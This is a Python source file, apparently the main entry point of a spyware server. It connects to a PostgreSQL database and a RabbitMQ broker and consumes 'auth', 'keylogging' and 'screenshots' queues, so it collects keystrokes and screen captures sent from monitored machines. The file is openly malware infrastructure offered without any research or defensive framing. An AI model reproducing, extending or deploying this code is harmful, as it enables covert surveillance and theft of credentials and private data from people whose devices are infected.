import pika, psycopg2 as pg

from spyware_server_common.config import get_config
from .consumers.authentication import create_authentication_callback
from .consumers.keylogging import create_keylogging_callback
from .consumers.screenshots import create_screenshots_callback
from .amqp import openAmqpConnection, initQueues

def main () :
    config = get_config("./config.json")
    rmqConfig = config["rmq"]

    pgConnection = pg.connect(**config['db'])
    pgCursor = pgConnection.cursor()
    amqpConnection = openAmqpConnection(rmqConfig)
    mainChannel = amqpConnection.channel()
    
    try :
        initQueues(amqpConnection)

        mainChannel.basic_qos(prefetch_count=1)
        mainChannel.basic_consume('auth', create_authentication_callback(pgCursor))
        mainChannel.basic_consume('keylogging', create_keylogging_callback(pgCursor))
        mainChannel.basic_consume('screenshots', create_screenshots_callback())

        mainChannel.start_consuming()
    except KeyboardInterrupt :
        pgConnection.close()
        amqpConnection.close()

if __name__ == '__main__' :
    main()